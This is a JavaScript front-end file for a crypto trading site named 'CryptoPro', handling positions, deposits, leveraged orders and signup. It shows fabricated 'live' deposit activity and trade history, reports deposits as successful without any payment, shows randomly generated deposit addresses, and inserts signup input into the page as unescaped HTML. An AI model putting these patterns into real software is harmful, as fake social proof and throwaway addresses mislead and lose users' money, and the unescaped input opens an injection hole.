// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// POSITIONS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const DEMO_POSITIONS=[
  {pair:'BTC/USDT',type:'long',size:0.05,entry:65800,lev:10,pnl:null,sl:63000,tp:72000},
  {pair:'ETH/USDT',type:'short',size:0.5,entry:3600,lev:5,pnl:null,sl:3800,tp:3200},
];
function calcPnl(pos){
  const curr=STATE.prices[pos.pair]||pos.entry;
  const diff=pos.type==='long'?curr-pos.entry:pos.entry-curr;
  return diff*pos.size*pos.lev;
}
function buildDashPositions(){
  const el=$('dashPositions');
  if(!el) return;
  if(!STATE.loggedIn){ el.innerHTML=`<div class="empty-state"><div style="font-size:28px">ðŸ“­</div><div style="font-size:12px;color:var(--text3);margin-top:6px">Sign in to view positions</div></div>`; return; }
  if(DEMO_POSITIONS.length===0){ el.innerHTML=`<div class="empty-state"><div style="font-size:28px">ðŸ“­</div><div style="font-size:12px;color:var(--text3);margin-top:6px">No open positions</div></div>`; return; }
  el.innerHTML=DEMO_POSITIONS.slice(0,2).map((p,i)=>{
    const pnl=calcPnl(p);
    return `<div class="position-row">
      <div class="pr-top">
        <span class="pr-pair">${p.pair}</span>
        <span class="pr-type ${p.type}">${p.type.toUpperCase()} ${p.lev}x</span>
        <span class="pr-pnl ${pnl>=0?'text-green':'text-red'}">${pnl>=0?'+':''}$${formatNum(Math.abs(pnl))}</span>
      </div>
      <div class="pr-stats">
        <div class="pr-stat"><span class="pr-stat-lbl">Entry</span><span class="pr-stat-val">$${formatNum(p.entry)}</span></div>
        <div class="pr-stat"><span class="pr-stat-lbl">Mark</span><span class="pr-stat-val">$${formatNum(STATE.prices[p.pair])}</span></div>
        <div class="pr-stat"><span class="pr-stat-lbl">TP</span><span class="pr-stat-val text-green">$${formatNum(p.tp)}</span></div>
        <div class="pr-stat"><span class="pr-stat-lbl">SL</span><span class="pr-stat-val text-red">$${formatNum(p.sl)}</span></div>
      </div>
      <button class="pr-close-btn" onclick="closePosition(${i})">Close Position</button>
    </div>`;
  }).join('');
}
function buildPositionsSection(){
  const el=$('positionsList');
  if(!el) return;
  el.innerHTML=DEMO_POSITIONS.map((p,i)=>{
    const pnl=calcPnl(p);
    return `<div class="position-row">
      <div class="pr-top">
        <span class="pr-pair">${p.pair}</span>
        <span class="pr-type ${p.type}">${p.type.toUpperCase()} ${p.lev}x</span>
        <span class="pr-pnl ${pnl>=0?'text-green':'text-red'}">${pnl>=0?'+':''}$${formatNum(Math.abs(pnl))}</span>
      </div>
      <div class="pr-stats">
        <div class="pr-stat"><span class="pr-stat-lbl">Entry</span><span class="pr-stat-val">$${formatNum(p.entry)}</span></div>
        <div class="pr-stat"><span class="pr-stat-lbl">Current</span><span class="pr-stat-val">$${formatNum(STATE.prices[p.pair])}</span></div>
        <div class="pr-stat"><span class="pr-stat-lbl">Size</span><span class="pr-stat-val">${p.size} BTC</span></div>
        <div class="pr-stat"><span class="pr-stat-lbl">Lev</span><span class="pr-stat-val">${p.lev}x</span></div>
      </div>
      <button class="pr-close-btn" onclick="closePosition(${i})">Close Position</button>
    </div>`;
  }).join('');
}
function closePosition(idx){
  const pos=DEMO_POSITIONS[idx];
  const pnl=calcPnl(pos);
  DEMO_POSITIONS.splice(idx,1);
  STATE.user.balance+=pnl;
  showToast(`${pnl>=0?'âœ…':'â›”'} Position closed: ${pnl>=0?'+':''}$${formatNum(Math.abs(pnl))} PnL`,'blue');
  buildDashPositions();
  updateNavBalance();
}
function buildPosHistory(){
  const body=$('posHistoryBody');
  if(!body) return;
  const hist=[
    {pair:'BTC/USDT',type:'long',pnl:+840.20,roi:'+12.8%',date:'2h ago'},
    {pair:'ETH/USDT',type:'short',pnl:-120.40,roi:'-3.4%',date:'5h ago'},
    {pair:'SOL/USDT',type:'long',pnl:+224.80,roi:'+18.2%',date:'1d ago'},
    {pair:'BNB/USDT',type:'long',pnl:+87.40,roi:'+7.2%',date:'2d ago'},
  ];
  body.innerHTML=hist.map(h=>`<tr class="hist-row">
    <td>${h.pair}</td>
    <td><span class="pr-type ${h.type}">${h.type.toUpperCase()}</span></td>
    <td style="text-align:right;font-family:var(--font-mono);font-weight:700;color:${h.pnl>=0?'var(--green)':'var(--red)'}">${h.pnl>=0?'+':''}$${formatNum(Math.abs(h.pnl))}</td>
    <td style="text-align:right;font-family:var(--font-mono);color:${h.pnl>=0?'var(--green)':'var(--red)'}">${h.roi}</td>
    <td style="text-align:right;font-size:11px;color:var(--text3)">${h.date}</td>
  </tr>`).join('');
}
function buildRecentTrades(){
  const el=$('dashRecentTrades');
  if(!el) return;
  const trades=[
    {type:'win',pair:'BTC/USDT',pnl:840,date:'2h ago'},
    {type:'loss',pair:'ETH/USDT',pnl:-120,date:'5h ago'},
    {type:'win',pair:'SOL/USDT',pnl:224,date:'1d ago'},
    {type:'win',pair:'BNB/USDT',pnl:87,date:'2d ago'},
    {type:'win',pair:'XRP/USDT',pnl:42,date:'3d ago'},
  ];
  el.innerHTML=trades.map(t=>`<div class="rt-row">
    <span class="rt-type ${t.type}">${t.type.toUpperCase()}</span>
    <span class="rt-pair">${t.pair}</span>
    <span class="rt-pnl ${t.pnl>=0?'text-green':'text-red'}">${t.pnl>=0?'+':''}$${formatNum(Math.abs(t.pnl))}</span>
    <span class="rt-date">${t.date}</span>
  </div>`).join('');
}
function buildTradeHistory(){
  const body=$('tradeHistoryBody');
  if(!body) return;
  const hist=[
    {date:'Today 14:32',pair:'BTC/USDT',side:'BUY',price:67420,amt:0.05,pnl:+840},
    {date:'Today 09:18',pair:'ETH/USDT',side:'SELL',price:3580,amt:0.3,pnl:-120},
    {date:'Yesterday',pair:'SOL/USDT',side:'BUY',price:178,amt:2.5,pnl:+224},
    {date:'Jan 26',pair:'BNB/USDT',side:'BUY',price:405,amt:1.2,pnl:+87},
    {date:'Jan 25',pair:'XRP/USDT',side:'SELL',price:0.628,amt:500,pnl:+42},
    {date:'Jan 24',pair:'BTC/USDT',side:'BUY',price:66120,amt:0.08,pnl:+1240},
  ];
  body.innerHTML=hist.map(h=>`<tr class="hist-row">
    <td style="font-size:11px;color:var(--text3)">${h.date}</td>
    <td style="font-weight:600">${h.pair}</td>
    <td><span class="pr-type ${h.side==='BUY'?'long':'short'}" style="font-size:10px">${h.side}</span></td>
    <td style="text-align:right;font-family:var(--font-mono)">${formatUSD(h.price)}</td>
    <td style="text-align:right;font-family:var(--font-mono)">${h.amt}</td>
    <td style="text-align:right;font-family:var(--font-mono);font-weight:700;color:${h.pnl>=0?'var(--green)':'var(--red)'}">${h.pnl>=0?'+':''}$${formatNum(Math.abs(h.pnl))}</td>
  </tr>`).join('');
}
function buildMarketSnap(){
  const el=$('dashMarketSnap');
  if(!el) return;
  const pairs=['BTC/USDT','ETH/USDT','SOL/USDT','BNB/USDT','XRP/USDT'];
  el.innerHTML=pairs.map(p=>{
    const chg=parseFloat(STATE.changes[p]);
    return `<div class="ms-row" onclick="STATE.selectedPair='${p}';showLayer('chartLayer')">
      <span class="ms-sym">${p.replace('/USDT','')}</span>
      <span class="ms-price" style="color:var(--text2)">${formatUSD(STATE.prices[p])}</span>
      <span class="ms-chg ${chg>=0?'nt-up':'nt-dn'}">${formatPct(chg)}</span>
    </div>`;
  }).join('');
}
function buildLiveTxFeed(){
  const el=$('liveTxFeed');
  if(!el) return;
  const txs=[
    {type:'deposit',label:'DEPOSIT',user:'Mike****',amt:'+$1,200',time:'just now'},
    {type:'trade',label:'TRADE',user:'Sara****',amt:'BTC Long 10x',time:'1m ago'},
    {type:'withdraw',label:'WITHDRAW',user:'John****',amt:'-$450',time:'2m ago'},
    {type:'deposit',label:'DEPOSIT',user:'Lisa****',amt:'+$5,000',time:'3m ago'},
    {type:'trade',label:'TRADE',user:'Chen****',amt:'ETH Short 5x',time:'5m ago'},
    {type:'deposit',label:'DEPOSIT',user:'Omar****',amt:'+$800',time:'7m ago'},
  ];
  el.innerHTML=txs.map(tx=>`<div class="tx-row">
    <span class="tx-type tx-${tx.type}">${tx.label}</span>
    <span style="color:var(--text2);flex:1">${tx.user}</span>
    <span style="font-family:var(--font-mono);font-size:12px;font-weight:700;color:${tx.type==='withdraw'?'var(--red)':tx.type==='deposit'?'var(--green)':'var(--blue)'}">${tx.amt}</span>
    <span style="font-size:10px;color:var(--text3)">${tx.time}</span>
  </div>`).join('');
}
function buildStreakDots(){
  const el=$('streakDots');
  if(!el) return;
  el.innerHTML=['M','T','W','T','F','S','S'].map((d,i)=>`
    <div style="text-align:center">
      <div class="streak-dot ${i<7?'done':i===6?'today':'future'}" style="background:${i<5?'linear-gradient(135deg,#FF6B3D,#FF3D57)':i===5?'var(--yellow)':'var(--bg4)'}"></div>
    </div>`).join('');
}
function buildRecActions(){
  const el=$('recActions');
  if(!el) return;
  const actions=[
    {icon:'ðŸ“Š',title:'Complete KYC Verification',desc:'Unlock full withdrawal limits and VIP perks â€” takes 5 minutes',priority:'high',action:()=>startKYC()},
    {icon:'ðŸ’³',title:'Make Your First Deposit',desc:'Claim your $50 welcome bonus when you deposit $100+',priority:'high',action:()=>showLayer('depositLayer')},
    {icon:'ðŸ¤–',title:'Activate a Trading Bot',desc:'Let your portfolio grow 24/7 with no manual trading required',priority:'med',action:()=>showLayer('botsLayer')},
    {icon:'ðŸŽ¯',title:'Check Today\'s Signals',desc:'5 new high-confidence signals available right now',priority:'low',action:()=>showLayer('signalsLayer')},
  ];
  el.innerHTML=actions.map(a=>`<div class="rec-action-card" onclick="(${a.action.toString()})()">
    <div class="rec-action-icon" style="background:var(--bg2)">${a.icon}</div>
    <div style="flex:1;min-width:0">
      <div style="font-size:13px;font-weight:700;margin-bottom:3px">${a.title}</div>
      <div style="font-size:12px;color:var(--text2)">${a.desc}</div>
    </div>
    <div><span class="rec-priority ${a.priority}">${a.priority.toUpperCase()}</span></div>
  </div>`).join('');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// DEPOSIT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
const DEP_METHODS=[
  {id:'btc',icon:'â‚¿',label:'Bitcoin',type:'crypto'},
  {id:'eth',icon:'Îž',label:'Ethereum',type:'crypto'},
  {id:'usdt',icon:'â‚®',label:'USDT TRC20',type:'crypto'},
  {id:'card',icon:'ðŸ’³',label:'Credit Card',type:'card'},
  {id:'bank',icon:'ðŸ¦',label:'Bank Wire',type:'bank'},
  {id:'paypal',icon:'ðŸ…¿',label:'PayPal',type:'other'},
  {id:'applepay',icon:'ðŸŽ',label:'Apple Pay',type:'other'},
  {id:'googlepay',icon:'G',label:'Google Pay',type:'other'},
];
let selDepMethod='btc';
function buildDepMethods(){
  const grid=$('depMethodGrid');
  if(!grid) return;
  grid.innerHTML=DEP_METHODS.map(m=>`
    <div class="dep-method-btn ${m.id===selDepMethod?'active':''}" onclick="selectDepMethod('${m.id}')">
      <div style="font-size:20px;margin-bottom:4px">${m.icon}</div>
      <div style="font-size:11px;font-weight:600;text-align:center">${m.label}</div>
    </div>`).join('');
}
function selectDepMethod(id){
  selDepMethod=id;
  buildDepMethods();
  const m=DEP_METHODS.find(x=>x.id===id);
  const crypto=$('cryptoAddrSection'), card=$('cardFormSection'), bank=$('bankFormSection');
  [crypto,card,bank].forEach(el=>{if(el)el.style.display='none';});
  if(m.type==='crypto' && crypto){ crypto.style.display='block'; $('depCryptoAddr').textContent=genCryptoAddr(id); }
  if(m.type==='card' && card) card.style.display='block';
  if(m.type==='bank' && bank) bank.style.display='block';
}
function genCryptoAddr(coin){
  const chars='abcdef0123456789'; let addr='0x';
  for(let i=0;i<40;i++) addr+=chars[Math.floor(Math.random()*chars.length)];
  return coin==='btc'?addr.replace('0x','1A').toUpperCase():addr;
}
function copyDepAddr(){ navigator.clipboard?.writeText($('depCryptoAddr').textContent); showToast('ðŸ“‹ Address copied!','green'); }
function setDepAmt(amt){ $('depAmount').value=amt; updateDepBonus(); }
function updateDepBonus(){
  const amt=parseFloat($('depAmount')?.value||0);
  const tiers=[{min:50,bonus:10},{min:100,bonus:25},{min:250,bonus:75},{min:500,bonus:200}];
  const fill=$('depBonusFill');
  if(fill) fill.style.width=Math.min((amt/500)*100,100)+'%';
  ['dbbTier1','dbbTier2','dbbTier3','dbbTier4'].forEach((id,i)=>{
    const el=$(id); if(!el) return;
    el.className='dbb-tier '+(amt>=tiers[i].min?'unlocked':i===0&&amt>0?'active':'locked');
  });
}
function submitDeposit(){
  const amt=parseFloat($('depAmount')?.value||0);
  if(amt<10){ showToast('âš ï¸ Minimum deposit is $10','yellow'); return; }
  const btn=$('depSubmitBtn'), btnText=$('depBtnText');
  btn.disabled=true;
  btnText.innerHTML='<span class="btn-spinner">âŸ³</span> Processing...';
  setTimeout(()=>{
    STATE.user.balance+=amt;
    updateNavBalance();
    btn.disabled=false;
    btnText.textContent='ðŸ’³ Deposit Now';
    showToast(`âœ… Deposit of $${formatNum(amt)} successful!\nðŸŽ Bonus funds applied to your account.`,'green',5000);
    showLayer('dashboardLayer');
    showDashSection('overview');
  }, 2500);
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// ORDER PLACEMENT
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function setOrderSide(side){
  STATE.orderSide=side;
  $('otBuy').className='ot-btn buy '+(side==='buy'?'active':'');
  $('otSell').className='ot-btn sell '+(side==='sell'?'active':'');
  const btn=$('orderSubmitBtn');
  if(btn){
    btn.className='order-submit-btn '+(side==='buy'?'buy':'sell');
    btn.textContent=side==='buy'?'BUY / LONG BTC':'SELL / SHORT BTC';
  }
  updateOrderSummary();
}
function setOrderType(type,el){
  STATE.orderType=type;
  document.querySelectorAll('.order-type-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  const priceGrp=$('orderPrice')?.closest('.op-group');
  if(priceGrp) priceGrp.style.opacity=type==='market'?'0.5':'1';
}
function updateLeverage(val){
  STATE.leverage=parseInt(val);
  $('leverageVal').textContent=val+'x';
  const slider=$('leverageSlider');
  if(slider) slider.style.background=`linear-gradient(to right,var(--green) 0%,var(--green) ${val}%,var(--bg3) ${val}%,var(--bg3) 100%)`;
  updateRiskMeter();
  updateOrderSummary();
}
function setLeverage(val){
  STATE.leverage=val;
  const sl=$('leverageSlider');
  if(sl){ sl.value=val; updateLeverage(val); }
}
function updateRiskMeter(){
  const lev=STATE.leverage;
  const pct=Math.min(lev,50)*2;
  const fill=$('riskFill');
  const lbl=$('riskLabel');
  if(fill){
    fill.style.width=pct+'%';
    if(lev<=5){ fill.style.background='var(--green)'; if(lbl){lbl.textContent='Low Risk';lbl.style.color='var(--green)';} }
    else if(lev<=25){ fill.style.background='var(--yellow)'; if(lbl){lbl.textContent='Medium Risk';lbl.style.color='var(--yellow)';} }
    else{ fill.style.background='var(--red)'; if(lbl){lbl.textContent='High Risk';lbl.style.color='var(--red)';} }
  }
  const warn=$('liqWarning');
  if(warn) warn.classList.toggle('show',lev>=50);
}
function calcOrderUSD(){
  const price=parseFloat($('orderPrice')?.value||STATE.prices['BTC/USDT']);
  const amt=parseFloat($('orderAmt')?.value||0);
  const usdEl=$('orderUSDVal');
  if(usdEl) usdEl.textContent='â‰ˆ '+formatUSD(price*amt);
  updateOrderSummary();
}
function setOrderPct(pct){
  const bal=STATE.user[STATE.user.mode==='live'?'balance':'demoBalance'];
  const price=parseFloat($('orderPrice')?.value||STATE.prices['BTC/USDT']);
  const lev=STATE.leverage;
  const maxBTC=(bal*lev*pct/100)/price;
  const amtEl=$('orderAmt');
  if(amtEl){ amtEl.value=maxBTC.toFixed(4); calcOrderUSD(); }
}
function updateOrderSummary(){
  const price=parseFloat($('orderPrice')?.value||STATE.prices['BTC/USDT']);
  const amt=parseFloat($('orderAmt')?.value||0);
  const lev=STATE.leverage;
  const val=price*amt*lev;
  const margin=val/lev;
  const fee=val*0.0004;
  const liqPrice=STATE.orderSide==='buy'?price*(1-1/lev*0.8):price*(1+1/lev*0.8);
  const tpPrice=parseFloat($('orderTP')?.value||0);
  const potProfit=tpPrice?Math.abs(tpPrice-price)*amt*lev:'â€”';
  const sumMap={osSumVal:formatUSD(val),osSumMargin:formatUSD(margin),osSumLiq:formatUSD(liqPrice),osSumFee:formatUSD(fee),osSumProfit:potProfit==='â€”'?'â€”':formatUSD(potProfit)};
  Object.entries(sumMap).forEach(([id,val])=>{ const el=$(id); if(el) el.textContent=val; });
  // liq price display
  const liqEl=$('tpsLiq');
  if(liqEl&&amt>0) liqEl.textContent=formatUSD(liqPrice);
}
function setMarginMode(mode,el){
  document.querySelectorAll('.op-mode-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  showToast(`ðŸ“Š ${mode.charAt(0).toUpperCase()+mode.slice(1)} margin mode selected`,'blue');
}
function submitOrder(){
  if(!STATE.loggedIn){ showLayer('loginLayer'); return; }
  const price=parseFloat($('orderPrice')?.value||STATE.prices['BTC/USDT']);
  const amt=parseFloat($('orderAmt')?.value||0);
  if(!amt||amt<=0){ showToast('âš ï¸ Please enter a valid amount','yellow'); return; }
  const lev=STATE.leverage;
  const val=price*amt;
  const margin=val/lev;
  const side=STATE.orderSide;
  $('ocmTitle').innerHTML=`${side==='buy'?'âœ… Confirm BUY Order':'ðŸ”´ Confirm SELL Order'}`;
  $('ocmBody').innerHTML=`
    <div class="modal-row"><span>Pair</span><span>BTC/USDT PERP</span></div>
    <div class="modal-row"><span>Side</span><span style="color:${side==='buy'?'var(--green)':'var(--red)'};font-weight:800">${side.toUpperCase()}</span></div>
    <div class="modal-row"><span>Type</span><span>${STATE.orderType.toUpperCase()}</span></div>
    <div class="modal-row"><span>Leverage</span><span>${lev}x</span></div>
    <div class="modal-row"><span>Price</span><span>${formatUSD(price)}</span></div>
    <div class="modal-row"><span>Amount</span><span>${amt} BTC</span></div>
    <div class="modal-row"><span>Order Value</span><span>${formatUSD(val*lev)}</span></div>
    <div class="modal-row"><span>Required Margin</span><span style="color:var(--yellow)">${formatUSD(margin)}</span></div>
  `;
  const confirmBtn=$('ocmConfirmBtn');
  if(confirmBtn){ confirmBtn.className='btn btn-green'; confirmBtn.style.background=side==='buy'?'var(--green)':'var(--red)'; }
  openModal('orderConfirmModal');
}
function confirmOrder(){
  closeModal('orderConfirmModal');
  const amt=parseFloat($('orderAmt')?.value||0);
  const price=parseFloat($('orderPrice')?.value||STATE.prices['BTC/USDT']);
  const lev=STATE.leverage;
  const side=STATE.orderSide;
  // add to positions
  DEMO_POSITIONS.push({pair:'BTC/USDT',type:side==='buy'?'long':'short',size:amt,entry:price,lev,sl:side==='buy'?price*0.95:price*1.05,tp:side==='buy'?price*1.1:price*0.9});
  // show fill notification
  const fn=$('fillNotification');
  if(fn){
    $('fillIcon').textContent=side==='buy'?'âœ…':'ðŸ”´';
    $('fillText').textContent=`${side==='buy'?'BUY':'SELL'} Order Filled!`;
    $('fillSub').textContent=`${amt} BTC at ${formatUSD(price)} Â· ${lev}x leverage`;
    fn.style.display='flex';
    setTimeout(()=>{fn.style.display='none';},4000);
  }
  showToast(`${side==='buy'?'ðŸš€ Long':'ðŸ”´ Short'} position opened!\n${amt} BTC at ${formatUSD(price)} (${lev}x)`,'green');
  updateMyPositions();
}
function updateMyPositions(){
  const list=$('myPositionsList'), cnt=$('posCount');
  if(!list) return;
  if(DEMO_POSITIONS.length===0){
    list.innerHTML=`<div class="empty-state" style="padding:20px 12px"><div style="font-size:24px;margin-bottom:6px">ðŸ“­</div><div style="font-size:12px;color:var(--text3)">No open positions</div></div>`;
    if(cnt) cnt.textContent='0 open';
    return;
  }
  if(cnt) cnt.textContent=DEMO_POSITIONS.length+' open';
  list.innerHTML=DEMO_POSITIONS.map((p,i)=>{
    const pnl=calcPnl(p);
    return `<div class="my-pos-row">
      <div class="mpr-top">
        <span class="mpr-pair">${p.pair}</span>
        <span class="pr-type ${p.type}" style="font-size:10px">${p.type.toUpperCase()} ${p.lev}x</span>
      </div>
      <div class="mpr-stats">
        <span>Entry: $${formatNum(p.entry)}</span>
        <span>Size: ${p.size}</span>
      </div>
      <div style="display:flex;align-items:center;justify-content:space-between;margin-top:4px">
        <span class="mpr-pnl ${pnl>=0?'text-green':'text-red'}">${pnl>=0?'+':''}$${formatNum(Math.abs(pnl))}</span>
        <button class="mpr-close" onclick="closePosition(${i})">Close</button>
      </div>
    </div>`;
  }).join('');
}
setInterval(updateMyPositions, 5000);

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// PAIR BAR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function buildPairBar(){
  const bars=['pairBarInner','tradePairBar'];
  const pairs=Object.keys(STATE.prices);
  bars.forEach(id=>{
    const el=$(id); if(!el) return;
    el.innerHTML=pairs.map(p=>`<button class="pair-btn ${p===STATE.selectedPair?'active':''}" onclick="selectPair('${p}',this)">${p}</button>`).join('');
  });
}
function selectPair(pair,el){
  STATE.selectedPair=pair;
  document.querySelectorAll('.pair-btn').forEach(b=>b.classList.remove('active'));
  document.querySelectorAll(`.pair-btn`).forEach(b=>{ if(b.textContent===pair) b.classList.add('active'); });
  const lbl=$('chartPairLabel'); if(lbl) lbl.textContent=pair;
  updateAllPriceDisplays();
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// INTERVAL / INDICATOR
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
function setChartInterval(iv,el){
  document.querySelectorAll('#chartIntervals .iv-btn').forEach(b=>b.classList.remove('active'));
  el.classList.add('active');
  showToast(`ðŸ“Š Switched to ${iv} chart`,'blue');
}
function toggleIndicator(name,el){
  el.classList.toggle('active');
  showToast(`${el.classList.contains('active')?'âœ… Added':'âŒ Removed'} ${name} indicator`,'blue');
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// AUTH
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
let signupData={};
function doLogin(){
  const email=$('loginEmail')?.value?.trim();
  const pwd=$('loginPassword')?.value;
  const alertEl=$('loginAlert');
  if(!email||!pwd){
    showAlert(alertEl,'Please enter your email and password.','error'); return;
  }
  const btn=$('loginBtn'); btn.disabled=true;
  $('loginBtnText').innerHTML='<span class="btn-spinner">âŸ³</span> Signing in...';
  setTimeout(()=>{
    STATE.loggedIn=true;
    STATE.user.name=email.split('@')[0];
    STATE.user.email=email;
    btn.disabled=false;
    $('loginBtnText').textContent='Sign In';
    loginSuccess();
  },1800);
}
function doSocialLogin(provider){
  STATE.loggedIn=true;
  STATE.user.name=provider+' User';
  STATE.user.email=provider.toLowerCase()+'@example.com';
  loginSuccess();
}
function loginSuccess(){
  updateNavForLogin();
  showLayer('dashboardLayer');
  showDashSection('overview');
  showToast(`ðŸŽ‰ Welcome back, ${STATE.user.name.charAt(0).toUpperCase()+STATE.user.name.slice(1)}!`, 'green');
  startSessionTimer();
}
function signupNext1(){
  const first=$('signupFirst')?.value?.trim(), last=$('signupLast')?.value?.trim();
  const email=$('signupEmail')?.value?.trim(), country=$('signupCountry')?.value;
  const agreed=$('agreeTerms')?.checked;
  const alertEl=$('signupAlert1');
  if(!first||!last){ showAlert(alertEl,'Please enter your full name.','error'); return; }
  if(!email||!email.includes('@')){ showAlert(alertEl,'Please enter a valid email.','error'); return; }
  if(!country){ showAlert(alertEl,'Please select your country.','error'); return; }
  if(!agreed){ showAlert(alertEl,'Please agree to the Terms of Service.','error'); return; }
  signupData={first,last,email,country};
  $('signupStep1').style.display='none';
  $('signupStep2').style.display='block';
  $('signupProgressBar').style.width='66%';
  $('spStep1').classList.remove('active'); $('spStep2').classList.add('active');
}
function signupBack1(){ $('signupStep2').style.display='none'; $('signupStep1').style.display='block'; $('signupProgressBar').style.width='33%'; $('spStep2').classList.remove('active'); $('spStep1').classList.add('active'); }
function signupNext2(){
  const pwd=$('signupPwd')?.value, pwd2=$('signupPwd2')?.value;
  const alertEl=$('signupAlert2');
  if(pwd.length<8){ showAlert(alertEl,'Password must be at least 8 characters.','error'); return; }
  if(pwd!==pwd2){ showAlert(alertEl,'Passwords do not match.','error'); return; }
  signupData.pwd=pwd; signupData.ref=$('signupRef')?.value;
  $('signupStep2').style.display='none';
  $('signupStep3').style.display='block';
  $('signupProgressBar').style.width='100%';
  $('spStep2').classList.remove('active'); $('spStep3').classList.add('active');
  $('confirmBox').innerHTML=`
    <div class="confirm-row"><span>Name</span><span>${signupData.first} ${signupData.last}</span></div>
    <div class="confirm-row"><span>Email</span><span>${signupData.email}</span></div>
    <div class="confirm-row"><span>Country</span><span>${signupData.country}</span></div>
    <div class="confirm-row"><span>Referral Code</span><span>${signupData.ref||'None'}</span></div>
    <div class="confirm-row"><span>Welcome Bonus</span><span style="color:var(--green);font-weight:800">$50 on first deposit</span></div>
  `;
}
function signupBack2(){ $('signupStep3').style.display='none'; $('signupStep2').style.display='block'; $('signupProgressBar').style.width='66%'; $('spStep3').classList.remove('active'); $('spStep2').classList.add('active'); }
function doSignup(){
  const btn=$('signupFinalBtn'); btn.disabled=true;
  $('signupFinalText').innerHTML='<span class="btn-spinner">âŸ³</span> Creating account...';
  setTimeout(()=>{
    STATE.loggedIn=true;
    STATE.user.name=signupData.first;
    STATE.user.email=signupData.email;
    btn.disabled=false; $('signupFinalText').textContent='ðŸš€ Create Account';
    updateNavForLogin();
    // Show ref banner
    const rb=$('refBanner');
    if(rb){ rb.classList.add('show'); setTimeout(()=>rb.classList.remove('show'),8000); }
    showLayer('dashboardLayer');
    showDashSection('overview');
    showToast(`ðŸŽ‰ Welcome to CryptoPro, ${signupData.first}!\nðŸŽ $50 welcome bonus applied!`,'green',6000);
    openModal('kycModal');
    startSessionTimer();
  },2200);
}
function checkPwdStrength(pwd){
  let score=0;
  if(pwd.length>=8) score++;
  if(/[A-Z]/.test(pwd)) score++;
  if(/[0-9]/.test(pwd)) score++;
  if(/[^A-Za-z0-9]/.test(pwd)) score++;
  const fill=$('pwdFill'), lbl=$('pwdLabel');
  const colors=['var(--red)','var(--yellow)','var(--blue)','var(--green)'];
  const labels=['Weak','Fair','Good','Strong'];
  if(fill){ fill.style.width=(score*25)+'%'; fill.style.background=colors[score-1]||colors[0]; }
  if(lbl){ lbl.textContent=labels[score-1]||'Weak'; lbl.style.color=colors[score-1]||colors[0]; }
}
function showAlert(el, msg, type){
  if(!el) return;
  el.className='form-alert '+type;
  el.textContent=msg;
  el.style.display='block';
}
function togglePwd(id, btn){
  const inp=$(id); if(!inp) return;
  inp.type=inp.type==='password'?'text':'password';
  btn.textContent=inp.type==='password'?'ðŸ‘':'ðŸ™ˆ';
}
function updateNavForLogin(){
  $('navAuthBtns').style.display='none';
  $('navUserChip').style.display='block';
  $('navAvatarLetter').textContent=STATE.user.name.charAt(0).toUpperCase()||'U';
  $('navUserName').textContent=STATE.user.name;
  updateNavBalance();
  $('sidebarRefLink').textContent=`cryptopro.io/ref/${STATE.user.refCode}`;
  $('refLinkDisplay').textContent=`cryptopro.io/ref/${STATE.user.refCode}`;
  $('bankRef').textContent=`CP-${STATE.user.refCode}`;
  $('sidebarBalance').textContent=formatUSD(STATE.user.balance);
  $('dashTotalBal').textContent=formatUSD(STATE.user.balance);
  $('tpsBal').textContent=formatUSD(STATE.user.balance)+' USDT';
  const nb=$('posBadge'); if(nb) nb.textContent=DEMO_POSITIONS.length;
}
function updateNavBalance(){
  const bal=STATE.user[STATE.user.mode==='live'?'balance':'demoBalance'];
  const el=$('navUserBalance'); if(el) el.textContent=formatUSD(bal);
  const sb=$('sidebarBalance'); if(sb) sb.textContent=formatUSD(bal);
  const db=$('dashTotalBal'); if(db) db.textContent=formatUSD(bal);
}
function doLogout(){
  STATE.loggedIn=false;
